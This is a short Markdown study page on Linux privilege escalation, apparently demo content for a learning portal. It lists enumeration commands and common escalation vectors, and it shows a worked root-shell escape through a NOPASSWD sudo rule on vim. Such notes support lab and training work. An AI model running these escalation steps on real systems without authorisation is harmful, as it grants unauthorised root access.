# Linux Privilege Escalation Notes

A sample study-style page, the kind of content this portal is originally
built for — check the theme switcher for the HackTheBox-styled option.

## Enumeration

```bash
# Kernel and OS info
uname -a
cat /etc/os-release

# Sudo rights
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

## Common escalation vectors

- Misconfigured `sudo` entries (e.g. `NOPASSWD` on a dangerous binary)
- Writable `/etc/passwd` or `/etc/shadow`
- Cron jobs running as root that call a world-writable script
- Vulnerable SUID binaries — check [GTFOBins](https://gtfobins.github.io/)
- Kernel exploits on an outdated kernel version

## Example: exploiting a NOPASSWD sudo rule

```prompt
user@target:~$ sudo -l
Matching Defaults entries for user on target:
User user may run the following commands on target:
    (root) NOPASSWD: /usr/bin/vim
user@target:~$ sudo vim -c ':!/bin/sh'
# whoami
root
```

## Notes

> Always confirm findings in a lab environment you're authorised to test.
> This page is demo content only.
